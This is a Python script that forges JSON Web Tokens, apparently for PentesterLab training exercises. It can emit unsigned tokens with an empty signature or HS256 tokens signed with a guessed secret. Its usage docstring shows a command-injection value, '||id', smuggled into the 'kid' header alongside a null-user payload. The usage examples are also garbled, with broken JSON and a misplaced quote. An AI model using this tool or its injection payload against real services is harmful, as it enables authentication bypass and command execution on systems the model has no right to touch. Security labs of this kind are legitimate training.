#! /usr/bin/python3
'''
Usage: 
    python3 jwt_get_py -H '{"typ"{"typ":"JWT","alg":"HS256","kid":"||id"}' -P '{"user":null}'
    python3 jwt_get_py -H '{"typ"{"typ":"JWT","alg":"HS256","kid":"||id"}' -P '{"user":null} -s pentesterlab'
'''
import argparse
import base64
import hashlib
import hmac

parser = argparse.ArgumentParser()
parser.add_argument('-H', '--header', help='JWT Raw Header')
parser.add_argument('-P', '--payload', help='JWT Raw Payload')
parser.add_argument('-s', '--secret', help='Secret')
args = parser.parse_args()

if not (args.header or args.payload):
    print("Invalid operation, try -h or --help")
    exit(1)

header = args.header
payload = args.payload
secret_key = args.secret

header_encoded = base64.urlsafe_b64encode(header.encode()).decode('utf-8').replace("=", "")
payload_encoded = base64.urlsafe_b64encode(payload.encode()).decode('utf-8').replace("=", "")

def get_jwt(header_encoded, payload_encoded):
    return f"{header_encoded}.{payload_encoded}."

def get_hs256_secret_key_jwt(key, header_encoded, payload_encoded):
    msg = str(header_encoded) + "." + str(payload_encoded)
    sign_msg = hmac.new(secret_key.encode(), msg.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(sign_msg).decode('UTF-8').replace("=", "")
    token = f"{header_encoded}.{payload_encoded}.{signature_b64}"
    return token

if __name__ == "__main__":
    if secret_key:
        token = get_hs256_secret_key_jwt(secret_key, header_encoded, payload_encoded)
    else:
        token = get_jwt(header_encoded, payload_encoded)
   
    print(token)
